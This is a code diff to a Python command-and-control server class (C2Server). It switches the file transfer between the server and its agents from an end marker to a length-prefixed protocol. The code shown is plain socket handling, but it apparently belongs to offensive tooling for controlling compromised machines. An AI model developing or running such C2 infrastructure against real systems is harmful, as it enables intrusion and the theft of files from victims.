@@ -9,13 +9,19 @@ class C2Server:
         self.start_server()
 
     def receive_file(self, conn, filename):
-        with open(filename, "wb") as f:
-            while True:
-                data = conn.recv(1024)
-                if b"[ENDFILE]" in data:
-                    f.write(data.replace(b"[ENDFILE]", b""))
-                    break
-                f.write(data)
+        try:
+            size_data = conn.recv(10)
+            filesize = int(size_data.decode())
+            received = 0
+            with open(filename, "wb") as f:
+                while received < filesize:
+                    data = conn.recv(min(1024, filesize - received))
+                    if not data:
+                        break
+                    f.write(data)
+                    received += len(data)
+        except Exception as e:
+            print(f"[-] Error receiving file: {e}")
 
     def start_server(self):
         serversocket = socket.socket()
@@ -48,11 +54,12 @@ class C2Server:
                         print("[!] Agent not ready to receive file.")
                         continue
 
+                    filesize = os.path.getsize(filename)
+                    conn.send(str(filesize).zfill(10).encode())  # Send 10-byte size
+
                     with open(filename, "rb") as f:
-                        chunk = f.read(1024)
-                        while chunk:
+                        while chunk := f.read(1024):
                             conn.sendall(chunk)
-                        conn.sendall(b"[ENDFILE]")
                     print(f"[+] Sent file: {filename}")
                     continue
 
